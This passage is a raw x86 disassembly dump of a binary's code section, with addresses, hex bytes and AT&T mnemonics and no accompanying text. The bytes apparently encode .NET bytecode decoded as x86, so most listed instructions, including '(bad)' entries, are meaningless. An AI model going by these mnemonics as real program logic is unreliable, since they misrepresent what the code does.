  403528:	1f                   	pop    %ds
  403529:	2b 58 28             	sub    0x28(%eax),%ebx
  40352c:	59                   	pop    %ecx
  40352d:	00 00                	add    %al,(%eax)
  40352f:	0a 02                	or     (%edx),%al
  403531:	02 28                	add    (%eax),%ch
  403533:	33 00                	xor    (%eax),%eax
  403535:	00 0a                	add    %cl,(%edx)
  403537:	6f                   	outsl  %ds:(%esi),(%dx)
  403538:	34 00                	xor    $0x0,%al
  40353a:	00 0a                	add    %cl,(%edx)
  40353c:	13 0b                	adc    (%ebx),%ecx
  40353e:	12 0b                	adc    (%ebx),%cl
  403540:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  403546:	28 57 00             	sub    %dl,0x0(%edi)
  403549:	00 0a                	add    %cl,(%edx)
  40354b:	59                   	pop    %ecx
  40354c:	18 5b 02             	sbb    %bl,0x2(%ebx)
  40354f:	28 33                	sub    %dh,(%ebx)
  403551:	00 00                	add    %al,(%eax)
  403553:	0a 6f 34             	or     0x34(%edi),%ch
  403556:	00 00                	add    %al,(%eax)
  403558:	0a 13                	or     (%ebx),%dl
  40355a:	0c 12                	or     $0x12,%al
  40355c:	0c 28                	or     $0x28,%al
  40355e:	98                   	cwtl
  40355f:	00 00                	add    %al,(%eax)
  403561:	0a 02                	or     (%edx),%al
  403563:	28 58 00             	sub    %bl,0x0(%eax)
  403566:	00 0a                	add    %cl,(%edx)
  403568:	59                   	pop    %ecx
  403569:	18 5b 73             	sbb    %bl,0x73(%ebx)
  40356c:	31 00                	xor    %eax,(%eax)
  40356e:	00 0a                	add    %cl,(%edx)
  403570:	28 99 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ecx)
  403576:	02 02                	add    (%edx),%al
  403578:	28 33                	sub    %dh,(%ebx)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	0a 6f 34             	or     0x34(%edi),%ch
  40357f:	00 00                	add    %al,(%eax)
  403581:	0a 13                	or     (%ebx),%dl
  403583:	0d 12 0d 28 98       	or     $0x98280d12,%eax
  403588:	00 00                	add    %al,(%eax)
  40358a:	0a 28                	or     (%eax),%ch
  40358c:	59                   	pop    %ecx
  40358d:	00 00                	add    %al,(%eax)
  40358f:	0a 02                	or     (%edx),%al
  403591:	02 28                	add    (%eax),%ch
  403593:	33 00                	xor    (%eax),%eax
  403595:	00 0a                	add    %cl,(%edx)
  403597:	6f                   	outsl  %ds:(%esi),(%dx)
  403598:	34 00                	xor    $0x0,%al
  40359a:	00 0a                	add    %cl,(%edx)
  40359c:	13 0e                	adc    (%esi),%ecx
  40359e:	12 0e                	adc    (%esi),%cl
  4035a0:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  4035a6:	28 57 00             	sub    %dl,0x0(%edi)
  4035a9:	00 0a                	add    %cl,(%edx)
  4035ab:	59                   	pop    %ecx
  4035ac:	18 5b 16             	sbb    %bl,0x16(%ebx)
  4035af:	73 31                	jae    0x4035e2
  4035b1:	00 00                	add    %al,(%eax)
  4035b3:	0a 28                	or     (%eax),%ch
  4035b5:	99                   	cltd
  4035b6:	00 00                	add    %al,(%eax)
  4035b8:	0a 2a                	or     (%edx),%ch
  4035ba:	06                   	push   %es
  4035bb:	16                   	push   %ss
  4035bc:	3c e1                	cmp    $0xe1,%al
  4035be:	02 00                	add    (%eax),%al
  4035c0:	00 12                	add    %dl,(%edx)
  4035c2:	03 fe                	add    %esi,%edi
  4035c4:	15 0d 00 00 02       	adc    $0x200000d,%eax
  4035c9:	12 03                	adc    (%ebx),%al
  4035cb:	03 6f 92             	add    -0x6e(%edi),%ebp
  4035ce:	00 00                	add    %al,(%eax)
  4035d0:	0a 7d 34             	or     0x34(%ebp),%bh
  4035d3:	00 00                	add    %al,(%eax)
  4035d5:	04 12                	add    $0x12,%al
  4035d7:	03 03                	add    (%ebx),%eax
  4035d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4035da:	9a 00 00 0a 7d 35 00 	lcall  $0x35,$0x7d0a0000
  4035e1:	00 04 12             	add    %al,(%edx,%edx,1)
  4035e4:	03 16                	add    (%esi),%edx
  4035e6:	7d 36                	jge    0x40361e
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	04 15                	add    $0x15,%al
  4035ec:	13 04 15 13 05 12 03 	adc    0x3120513(,%edx,1),%eax
  4035f3:	7b 35                	jnp    0x40362a
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	04 16                	add    $0x16,%al
  4035f9:	32 3b                	xor    (%ebx),%bh
  4035fb:	16                   	push   %ss
  4035fc:	13 06                	adc    (%esi),%eax
  4035fe:	2b 27                	sub    (%edi),%esp
  403600:	02 7b 2e             	add    0x2e(%ebx),%bh
  403603:	00 00                	add    %al,(%eax)
  403605:	04 11                	add    $0x11,%al
  403607:	06                   	push   %es
  403608:	6f                   	outsl  %ds:(%esi),(%dx)
  403609:	83 00 00             	addl   $0x0,(%eax)
  40360c:	0a 7b 34             	or     0x34(%ebx),%bh
  40360f:	00 00                	add    %al,(%eax)
  403611:	04 12                	add    $0x12,%al
  403613:	03 7b 35             	add    0x35(%ebx),%edi
  403616:	00 00                	add    %al,(%eax)
  403618:	04 33                	add    $0x33,%al
  40361a:	06                   	push   %es
  40361b:	11 06                	adc    %eax,(%esi)
  40361d:	13 05 2b 15 11 06    	adc    0x611152b,%eax
  403623:	17                   	pop    %ss
  403624:	58                   	pop    %eax
  403625:	13 06                	adc    (%esi),%eax
  403627:	11 06                	adc    %eax,(%esi)
  403629:	02 7b 2e             	add    0x2e(%ebx),%bh
  40362c:	00 00                	add    %al,(%eax)
  40362e:	04 6f                	add    $0x6f,%al
  403630:	8f 00                	pop    (%eax)
  403632:	00 0a                	add    %cl,(%edx)
  403634:	32 ca                	xor    %dl,%cl
  403636:	11 05 16 3f 8f 00    	adc    %eax,0x8f3f16
  40363c:	00 00                	add    %al,(%eax)
  40363e:	12 03                	adc    (%ebx),%al
  403640:	02 7b 2e             	add    0x2e(%ebx),%bh
  403643:	00 00                	add    %al,(%eax)
  403645:	04 11                	add    $0x11,%al
  403647:	05 6f 83 00 00       	add    $0x836f,%eax
  40364c:	0a 7b 36             	or     0x36(%ebx),%bh
  40364f:	00 00                	add    %al,(%eax)
  403651:	04 17                	add    $0x17,%al
  403653:	58                   	pop    %eax
  403654:	7d 36                	jge    0x40368c
  403656:	00 00                	add    %al,(%eax)
  403658:	04 11                	add    $0x11,%al
  40365a:	05 17 58 13 07       	add    $0x7135817,%eax
  40365f:	2b 5d 02             	sub    0x2(%ebp),%ebx
  403662:	7b 2e                	jnp    0x403692
  403664:	00 00                	add    %al,(%eax)
  403666:	04 11                	add    $0x11,%al
  403668:	07                   	pop    %es
  403669:	6f                   	outsl  %ds:(%esi),(%dx)
  40366a:	83 00 00             	addl   $0x0,(%eax)
  40366d:	0a 7b 36             	or     0x36(%ebx),%bh
  403670:	00 00                	add    %al,(%eax)
  403672:	04 12                	add    $0x12,%al
  403674:	03 7b 36             	add    0x36(%ebx),%edi
  403677:	00 00                	add    %al,(%eax)
  403679:	04 32                	add    $0x32,%al
  40367b:	36 02 7b 2e          	add    %ss:0x2e(%ebx),%bh
  40367f:	00 00                	add    %al,(%eax)
  403681:	04 11                	add    $0x11,%al
  403683:	07                   	pop    %es
  403684:	6f                   	outsl  %ds:(%esi),(%dx)
  403685:	83 00 00             	addl   $0x0,(%eax)
  403688:	0a 7b 36             	or     0x36(%ebx),%bh
  40368b:	00 00                	add    %al,(%eax)
  40368d:	04 12                	add    $0x12,%al
  40368f:	03 7b 36             	add    0x36(%ebx),%edi
  403692:	00 00                	add    %al,(%eax)
  403694:	04 33                	add    $0x33,%al
  403696:	21 02                	and    %eax,(%edx)
  403698:	7b 2e                	jnp    0x4036c8
  40369a:	00 00                	add    %al,(%eax)
  40369c:	04 11                	add    $0x11,%al
  40369e:	07                   	pop    %es
  40369f:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a0:	83 00 00             	addl   $0x0,(%eax)
  4036a3:	0a 7b 35             	or     0x35(%ebx),%bh
  4036a6:	00 00                	add    %al,(%eax)
  4036a8:	04 12                	add    $0x12,%al
  4036aa:	03 7b 35             	add    0x35(%ebx),%edi
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	04 2e                	add    $0x2e,%al
  4036b1:	06                   	push   %es
  4036b2:	11 07                	adc    %eax,(%edi)
  4036b4:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4036b7:	15 11 07 17 58       	adc    $0x58170711,%eax
  4036bc:	13 07                	adc    (%edi),%eax
  4036be:	11 07                	adc    %eax,(%edi)
  4036c0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4036c3:	00 00                	add    %al,(%eax)
  4036c5:	04 6f                	add    $0x6f,%al
  4036c7:	8f 00                	pop    (%eax)
  4036c9:	00 0a                	add    %cl,(%edx)
  4036cb:	32 94 11 04 15 33 30 	xor    0x30331504(%ecx,%edx,1),%dl
  4036d2:	02 12                	add    (%edx),%dl
  4036d4:	03 02                	add    (%edx),%eax
  4036d6:	7b 2e                	jnp    0x403706
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	04 6f                	add    $0x6f,%al
  4036dc:	8f 00                	pop    (%eax)
  4036de:	00 0a                	add    %cl,(%edx)
  4036e0:	28 2f                	sub    %ch,(%edi)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	06                   	push   %es
  4036e5:	02 7b 2e             	add    0x2e(%ebx),%bh
  4036e8:	00 00                	add    %al,(%eax)
  4036ea:	04 6f                	add    $0x6f,%al
  4036ec:	8f 00                	pop    (%eax)
  4036ee:	00 0a                	add    %cl,(%edx)
  4036f0:	0a 02                	or     (%edx),%al
  4036f2:	7b 2e                	jnp    0x403722
  4036f4:	00 00                	add    %al,(%eax)
  4036f6:	04 09                	add    $0x9,%al
  4036f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f9:	9b                   	fwait
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	0a 38                	or     (%eax),%bh
  4036fe:	d8 00                	fadds  (%eax)
  403700:	00 00                	add    %al,(%eax)
  403702:	02 12                	add    (%edx),%dl
  403704:	03 11                	add    (%ecx),%edx
  403706:	04 28                	add    $0x28,%al
  403708:	2f                   	das
  403709:	00 00                	add    %al,(%eax)
  40370b:	06                   	push   %es
  40370c:	11 04 0a             	adc    %eax,(%edx,%ecx,1)
  40370f:	02 7b 2e             	add    0x2e(%ebx),%bh
  403712:	00 00                	add    %al,(%eax)
  403714:	04 11                	add    $0x11,%al
  403716:	04 09                	add    $0x9,%al
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	9c                   	pushf
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 06                	or     (%esi),%al
  40371e:	17                   	pop    %ss
  40371f:	58                   	pop    %eax
  403720:	13 08                	adc    (%eax),%ecx
  403722:	38 a1 00 00 00 02    	cmp    %ah,0x2000000(%ecx)
  403728:	7b 2e                	jnp    0x403758
  40372a:	00 00                	add    %al,(%eax)
  40372c:	04 11                	add    $0x11,%al
  40372e:	08 6f 83             	or     %ch,-0x7d(%edi)
  403731:	00 00                	add    %al,(%eax)
  403733:	0a 7b 2f             	or     0x2f(%ebx),%bh
  403736:	00 00                	add    %al,(%eax)
  403738:	04 1f                	add    $0x1f,%al
  40373a:	68 11 08 5a 1f       	push   $0x1f5a0811
  40373f:	0a 58 6f             	or     0x6f(%eax),%bl
  403742:	87 00                	xchg   %eax,(%eax)
  403744:	00 0a                	add    %cl,(%edx)
  403746:	02 7b 2e             	add    0x2e(%ebx),%bh
  403749:	00 00                	add    %al,(%eax)
  40374b:	04 11                	add    $0x11,%al
  40374d:	08 6f 83             	or     %ch,-0x7d(%edi)
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 7b 30             	or     0x30(%ebx),%bh
  403755:	00 00                	add    %al,(%eax)
  403757:	04 1f                	add    $0x1f,%al
  403759:	68 11 08 5a 1f       	push   $0x1f5a0811
  40375e:	1a 58 6f             	sbb    0x6f(%eax),%bl
  403761:	87 00                	xchg   %eax,(%eax)
  403763:	00 0a                	add    %cl,(%edx)
  403765:	02 7b 2e             	add    0x2e(%ebx),%bh
  403768:	00 00                	add    %al,(%eax)
  40376a:	04 11                	add    $0x11,%al
  40376c:	08 6f 83             	or     %ch,-0x7d(%edi)
  40376f:	00 00                	add    %al,(%eax)
  403771:	0a 7b 31             	or     0x31(%ebx),%bh
  403774:	00 00                	add    %al,(%eax)
  403776:	04 1f                	add    $0x1f,%al
  403778:	68 11 08 5a 1f       	push   $0x1f5a0811
  40377d:	2f                   	das
  40377e:	58                   	pop    %eax
  40377f:	6f                   	outsl  %ds:(%esi),(%dx)
  403780:	87 00                	xchg   %eax,(%eax)
  403782:	00 0a                	add    %cl,(%edx)
  403784:	02 7b 2e             	add    0x2e(%ebx),%bh
  403787:	00 00                	add    %al,(%eax)
  403789:	04 11                	add    $0x11,%al
  40378b:	08 6f 83             	or     %ch,-0x7d(%edi)
  40378e:	00 00                	add    %al,(%eax)
  403790:	0a 7b 32             	or     0x32(%ebx),%bh
  403793:	00 00                	add    %al,(%eax)
  403795:	04 1f                	add    $0x1f,%al
  403797:	68 11 08 5a 1f       	push   $0x1f5a0811
  40379c:	48                   	dec    %eax
  40379d:	58                   	pop    %eax
  40379e:	6f                   	outsl  %ds:(%esi),(%dx)
  40379f:	87 00                	xchg   %eax,(%eax)
  4037a1:	00 0a                	add    %cl,(%edx)
  4037a3:	02 7b 2e             	add    0x2e(%ebx),%bh
  4037a6:	00 00                	add    %al,(%eax)
  4037a8:	04 11                	add    $0x11,%al
  4037aa:	08 6f 83             	or     %ch,-0x7d(%edi)
  4037ad:	00 00                	add    %al,(%eax)
  4037af:	0a 7b 33             	or     0x33(%ebx),%bh
  4037b2:	00 00                	add    %al,(%eax)
  4037b4:	04 1f                	add    $0x1f,%al
  4037b6:	68 11 08 5a 1f       	push   $0x1f5a0811
  4037bb:	58                   	pop    %eax
  4037bc:	58                   	pop    %eax
  4037bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4037be:	87 00                	xchg   %eax,(%eax)
  4037c0:	00 0a                	add    %cl,(%edx)
  4037c2:	11 08                	adc    %ecx,(%eax)
  4037c4:	17                   	pop    %ss
  4037c5:	58                   	pop    %eax
  4037c6:	13 08                	adc    (%eax),%ecx
  4037c8:	11 08                	adc    %ecx,(%eax)
  4037ca:	02 7b 2e             	add    0x2e(%ebx),%bh
  4037cd:	00 00                	add    %al,(%eax)
  4037cf:	04 6f                	add    $0x6f,%al
  4037d1:	8f 00                	pop    (%eax)
  4037d3:	00 0a                	add    %cl,(%edx)
  4037d5:	3f                   	aas
  4037d6:	4d                   	dec    %ebp
  4037d7:	ff                   	(bad)
  4037d8:	ff                   	(bad)
  4037d9:	ff 1f                	lcall  *(%edi)
  4037db:	68 02 7b 2e 00       	push   $0x2e7b02
  4037e0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4037e3:	8f 00                	pop    (%eax)
  4037e5:	00 0a                	add    %cl,(%edx)
  4037e7:	5a                   	pop    %edx
  4037e8:	1f                   	pop    %ds
  4037e9:	2b 58 02             	sub    0x2(%eax),%ebx
  4037ec:	28 33                	sub    %dh,(%ebx)
  4037ee:	00 00                	add    %al,(%eax)
  4037f0:	0a 6f 34             	or     0x34(%edi),%ch
  4037f3:	00 00                	add    %al,(%eax)
  4037f5:	0a 13                	or     (%ebx),%dl
  4037f7:	0f 12 0f             	movlps (%edi),%xmm1
  4037fa:	28 98 00 00 0a 30    	sub    %bl,0x300a0000(%eax)
  403800:	5e                   	pop    %esi
  403801:	02 1f                	add    (%edi),%bl
  403803:	68 02 7b 2e 00       	push   $0x2e7b02
  403808:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40380b:	8f 00                	pop    (%eax)
  40380d:	00 0a                	add    %cl,(%edx)
  40380f:	5a                   	pop    %edx
  403810:	1f                   	pop    %ds
  403811:	2b 58 28             	sub    0x28(%eax),%ebx
  403814:	59                   	pop    %ecx
  403815:	00 00                	add    %al,(%eax)
  403817:	0a 02                	or     (%edx),%al
  403819:	02 28                	add    (%eax),%ch
  40381b:	33 00                	xor    (%eax),%eax
  40381d:	00 0a                	add    %cl,(%edx)
  40381f:	6f                   	outsl  %ds:(%esi),(%dx)
  403820:	34 00                	xor    $0x0,%al
  403822:	00 0a                	add    %cl,(%edx)
  403824:	13 10                	adc    (%eax),%edx
  403826:	12 10                	adc    (%eax),%dl
  403828:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  40382e:	28 57 00             	sub    %dl,0x0(%edi)
  403831:	00 0a                	add    %cl,(%edx)
  403833:	59                   	pop    %ecx
  403834:	18 5b 02             	sbb    %bl,0x2(%ebx)
  403837:	28 33                	sub    %dh,(%ebx)
  403839:	00 00                	add    %al,(%eax)
  40383b:	0a 6f 34             	or     0x34(%edi),%ch
  40383e:	00 00                	add    %al,(%eax)
  403840:	0a 13                	or     (%ebx),%dl
  403842:	11 12                	adc    %edx,(%edx)
  403844:	11 28                	adc    %ebp,(%eax)
  403846:	98                   	cwtl
  403847:	00 00                	add    %al,(%eax)
  403849:	0a 02                	or     (%edx),%al
  40384b:	28 58 00             	sub    %bl,0x0(%eax)
  40384e:	00 0a                	add    %cl,(%edx)
  403850:	59                   	pop    %ecx
  403851:	18 5b 73             	sbb    %bl,0x73(%ebx)
  403854:	31 00                	xor    %eax,(%eax)
  403856:	00 0a                	add    %cl,(%edx)
  403858:	28 99 00 00 0a 2b    	sub    %bl,0x2b0a0000(%ecx)
  40385e:	43                   	inc    %ebx
  40385f:	02 02                	add    (%edx),%al
  403861:	28 33                	sub    %dh,(%ebx)
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 6f 34             	or     0x34(%edi),%ch
  403868:	00 00                	add    %al,(%eax)
  40386a:	0a 13                	or     (%ebx),%dl
  40386c:	12 12                	adc    (%edx),%dl
  40386e:	12 28                	adc    (%eax),%ch
  403870:	98                   	cwtl
  403871:	00 00                	add    %al,(%eax)
  403873:	0a 28                	or     (%eax),%ch
  403875:	59                   	pop    %ecx
  403876:	00 00                	add    %al,(%eax)
  403878:	0a 02                	or     (%edx),%al
  40387a:	02 28                	add    (%eax),%ch
  40387c:	33 00                	xor    (%eax),%eax
  40387e:	00 0a                	add    %cl,(%edx)
  403880:	6f                   	outsl  %ds:(%esi),(%dx)
  403881:	34 00                	xor    $0x0,%al
  403883:	00 0a                	add    %cl,(%edx)
  403885:	13 13                	adc    (%ebx),%edx
  403887:	12 13                	adc    (%ebx),%dl
  403889:	28 35 00 00 0a 02    	sub    %dh,0x20a0000
  40388f:	28 57 00             	sub    %dl,0x0(%edi)
  403892:	00 0a                	add    %cl,(%edx)
  403894:	59                   	pop    %ecx
  403895:	18 5b 16             	sbb    %bl,0x16(%ebx)
  403898:	73 31                	jae    0x4038cb
  40389a:	00 00                	add    %al,(%eax)
  40389c:	0a 28                	or     (%eax),%ch
  40389e:	99                   	cltd
  40389f:	00 00                	add    %al,(%eax)
  4038a1:	0a 03                	or     (%ebx),%al
  4038a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a4:	9d                   	popf
  4038a5:	00 00                	add    %al,(%eax)
  4038a7:	0a 28                	or     (%eax),%ch
  4038a9:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  4038ae:	1e                   	push   %ds
  4038af:	02 7b 2e             	add    0x2e(%ebx),%bh
  4038b2:	00 00                	add    %al,(%eax)
  4038b4:	04 06                	add    $0x6,%al
  4038b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b7:	83 00 00             	addl   $0x0,(%eax)
  4038ba:	0a 7b 2f             	or     0x2f(%ebx),%bh
  4038bd:	00 00                	add    %al,(%eax)
  4038bf:	04 03                	add    $0x3,%al
  4038c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c2:	9d                   	popf
  4038c3:	00 00                	add    %al,(%eax)
  4038c5:	0a 6f 30             	or     0x30(%edi),%ch
  4038c8:	00 00                	add    %al,(%eax)
  4038ca:	0a 2b                	or     (%ebx),%ch
  4038cc:	1b 02                	sbb    (%edx),%eax
  4038ce:	7b 2e                	jnp    0x4038fe
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	04 06                	add    $0x6,%al
  4038d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038d5:	83 00 00             	addl   $0x0,(%eax)
  4038d8:	0a 7b 2f             	or     0x2f(%ebx),%bh
  4038db:	00 00                	add    %al,(%eax)
  4038dd:	04 72                	add    $0x72,%al
  4038df:	01 00                	add    %eax,(%eax)
  4038e1:	00 70 6f             	add    %dh,0x6f(%eax)
  4038e4:	30 00                	xor    %al,(%eax)
  4038e6:	00 0a                	add    %cl,(%edx)
  4038e8:	03 6f 9e             	add    -0x62(%edi),%ebp
  4038eb:	00 00                	add    %al,(%eax)
  4038ed:	0a 28                	or     (%eax),%ch
  4038ef:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  4038f4:	1e                   	push   %ds
  4038f5:	02 7b 2e             	add    0x2e(%ebx),%bh
  4038f8:	00 00                	add    %al,(%eax)
  4038fa:	04 06                	add    $0x6,%al
  4038fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4038fd:	83 00 00             	addl   $0x0,(%eax)
  403900:	0a 7b 30             	or     0x30(%ebx),%bh
  403903:	00 00                	add    %al,(%eax)
  403905:	04 03                	add    $0x3,%al
  403907:	6f                   	outsl  %ds:(%esi),(%dx)
  403908:	9e                   	sahf
  403909:	00 00                	add    %al,(%eax)
  40390b:	0a 6f 30             	or     0x30(%edi),%ch
  40390e:	00 00                	add    %al,(%eax)
  403910:	0a 2b                	or     (%ebx),%ch
  403912:	1b 02                	sbb    (%edx),%eax
  403914:	7b 2e                	jnp    0x403944
  403916:	00 00                	add    %al,(%eax)
  403918:	04 06                	add    $0x6,%al
  40391a:	6f                   	outsl  %ds:(%esi),(%dx)
  40391b:	83 00 00             	addl   $0x0,(%eax)
  40391e:	0a 7b 30             	or     0x30(%ebx),%bh
  403921:	00 00                	add    %al,(%eax)
  403923:	04 72                	add    $0x72,%al
  403925:	01 00                	add    %eax,(%eax)
  403927:	00 70 6f             	add    %dh,0x6f(%eax)
  40392a:	30 00                	xor    %al,(%eax)
  40392c:	00 0a                	add    %cl,(%edx)
  40392e:	03 6f 9f             	add    -0x61(%edi),%ebp
  403931:	00 00                	add    %al,(%eax)
  403933:	0a 16                	or     (%esi),%dl
  403935:	32 78 03             	xor    0x3(%eax),%bh
  403938:	6f                   	outsl  %ds:(%esi),(%dx)
  403939:	9f                   	lahf
  40393a:	00 00                	add    %al,(%eax)
  40393c:	0a 1f                	or     (%edi),%bl
  40393e:	64 30 6e 03          	xor    %ch,%fs:0x3(%esi)
  403942:	6f                   	outsl  %ds:(%esi),(%dx)
  403943:	9f                   	lahf
  403944:	00 00                	add    %al,(%eax)
  403946:	0a 1f                	or     (%edi),%bl
  403948:	64 2f                	fs das
  40394a:	20 02                	and    %al,(%edx)
  40394c:	7b 2e                	jnp    0x40397c
  40394e:	00 00                	add    %al,(%eax)
  403950:	04 06                	add    $0x6,%al
  403952:	6f                   	outsl  %ds:(%esi),(%dx)
  403953:	83 00 00             	addl   $0x0,(%eax)
  403956:	0a 7b 31             	or     0x31(%ebx),%bh
  403959:	00 00                	add    %al,(%eax)
  40395b:	04 03                	add    $0x3,%al
  40395d:	6f                   	outsl  %ds:(%esi),(%dx)
  40395e:	9f                   	lahf
  40395f:	00 00                	add    %al,(%eax)
  403961:	0a 17                	or     (%edi),%dl
  403963:	58                   	pop    %eax
  403964:	6f                   	outsl  %ds:(%esi),(%dx)
  403965:	84 00                	test   %al,(%eax)
  403967:	00 0a                	add    %cl,(%edx)
  403969:	2b 18                	sub    (%eax),%ebx
  40396b:	02 7b 2e             	add    0x2e(%ebx),%bh
  40396e:	00 00                	add    %al,(%eax)
  403970:	04 06                	add    $0x6,%al
  403972:	6f                   	outsl  %ds:(%esi),(%dx)
  403973:	83 00 00             	addl   $0x0,(%eax)
  403976:	0a 7b 31             	or     0x31(%ebx),%bh
  403979:	00 00                	add    %al,(%eax)
  40397b:	04 1f                	add    $0x1f,%al
  40397d:	63 6f 84             	arpl   %ebp,-0x7c(%edi)
  403980:	00 00                	add    %al,(%eax)
  403982:	0a 02                	or     (%edx),%al
  403984:	7b 2e                	jnp    0x4039b4
  403986:	00 00                	add    %al,(%eax)
  403988:	04 06                	add    $0x6,%al
  40398a:	6f                   	outsl  %ds:(%esi),(%dx)
  40398b:	83 00 00             	addl   $0x0,(%eax)
  40398e:	0a 7b 31             	or     0x31(%ebx),%bh
  403991:	00 00                	add    %al,(%eax)
  403993:	04 17                	add    $0x17,%al
  403995:	6f                   	outsl  %ds:(%esi),(%dx)
  403996:	1b 00                	sbb    (%eax),%eax
  403998:	00 0a                	add    %cl,(%edx)
  40399a:	02 06                	add    (%esi),%al
  40399c:	7d 2b                	jge    0x4039c9
  40399e:	00 00                	add    %al,(%eax)
  4039a0:	04 02                	add    $0x2,%al
  4039a2:	03 6f 9f             	add    -0x61(%edi),%ebp
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	0a 7d 2c             	or     0x2c(%ebp),%bh
  4039aa:	00 00                	add    %al,(%eax)
  4039ac:	04 2b                	add    $0x2b,%al
  4039ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4039af:	03 6f 9f             	add    -0x61(%edi),%ebp
  4039b2:	00 00                	add    %al,(%eax)
  4039b4:	0a 1f                	or     (%edi),%bl
  4039b6:	64 31 3e             	xor    %edi,%fs:(%esi)
  4039b9:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039bc:	00 00                	add    %al,(%eax)
  4039be:	04 06                	add    $0x6,%al
  4039c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c1:	83 00 00             	addl   $0x0,(%eax)
  4039c4:	0a 7b 31             	or     0x31(%ebx),%bh
  4039c7:	00 00                	add    %al,(%eax)
  4039c9:	04 16                	add    $0x16,%al
  4039cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4039cc:	84 00                	test   %al,(%eax)
  4039ce:	00 0a                	add    %cl,(%edx)
  4039d0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039d3:	00 00                	add    %al,(%eax)
  4039d5:	04 06                	add    $0x6,%al
  4039d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d8:	83 00 00             	addl   $0x0,(%eax)
  4039db:	0a 7b 31             	or     0x31(%ebx),%bh
  4039de:	00 00                	add    %al,(%eax)
  4039e0:	04 17                	add    $0x17,%al
  4039e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039e3:	1b 00                	sbb    (%eax),%eax
  4039e5:	00 0a                	add    %cl,(%edx)
  4039e7:	02 06                	add    (%esi),%al
  4039e9:	7d 2b                	jge    0x403a16
  4039eb:	00 00                	add    %al,(%eax)
  4039ed:	04 02                	add    $0x2,%al
  4039ef:	16                   	push   %ss
  4039f0:	7d 2c                	jge    0x403a1e
  4039f2:	00 00                	add    %al,(%eax)
  4039f4:	04 2b                	add    $0x2b,%al
  4039f6:	27                   	daa
  4039f7:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	04 06                	add    $0x6,%al
  4039fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ff:	83 00 00             	addl   $0x0,(%eax)
  403a02:	0a 7b 31             	or     0x31(%ebx),%bh
  403a05:	00 00                	add    %al,(%eax)
  403a07:	04 16                	add    $0x16,%al
  403a09:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0a:	1b 00                	sbb    (%eax),%eax
  403a0c:	00 0a                	add    %cl,(%edx)
  403a0e:	02 7b 2b             	add    0x2b(%ebx),%bh
  403a11:	00 00                	add    %al,(%eax)
  403a13:	04 06                	add    $0x6,%al
  403a15:	33 07                	xor    (%edi),%eax
  403a17:	02 15 7d 2b 00 00    	add    0x2b7d,%dl
  403a1d:	04 03                	add    $0x3,%al
  403a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403a20:	a0 00 00 0a 16       	mov    0x160a0000,%al
  403a25:	32 60 12             	xor    0x12(%eax),%ah
  403a28:	09 16                	or     %edx,(%esi)
  403a2a:	16                   	push   %ss
  403a2b:	03 6f a0             	add    -0x60(%edi),%ebp
  403a2e:	00 00                	add    %al,(%eax)
  403a30:	0a 28                	or     (%eax),%ch
  403a32:	a1 00 00 0a 02       	mov    0x20a0000,%eax
  403a37:	7b 2e                	jnp    0x403a67
  403a39:	00 00                	add    %al,(%eax)
  403a3b:	04 06                	add    $0x6,%al
  403a3d:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3e:	83 00 00             	addl   $0x0,(%eax)
  403a41:	0a 7b 32             	or     0x32(%ebx),%bh
  403a44:	00 00                	add    %al,(%eax)
  403a46:	04 72                	add    $0x72,%al
  403a48:	07                   	pop    %es
  403a49:	01 00                	add    %eax,(%eax)
  403a4b:	70 72                	jo     0x403abf
  403a4d:	29 01                	sub    %eax,(%ecx)
  403a4f:	00 70 12             	add    %dh,0x12(%eax)
  403a52:	09 28                	or     %ebp,(%eax)
  403a54:	a2 00 00 0a 69       	mov    %al,0x690a0000
  403a59:	8c 5d 00             	mov    %ds,0x0(%ebp)
  403a5c:	00 01                	add    %al,(%ecx)
  403a5e:	12 09                	adc    (%ecx),%cl
  403a60:	28 a3 00 00 0a 8c    	sub    %ah,-0x73f60000(%ebx)
  403a66:	5d                   	pop    %ebp
  403a67:	00 00                	add    %al,(%eax)
  403a69:	01 12                	add    %edx,(%edx)
  403a6b:	09 28                	or     %ebp,(%eax)
  403a6d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a6e:	00 00                	add    %al,(%eax)
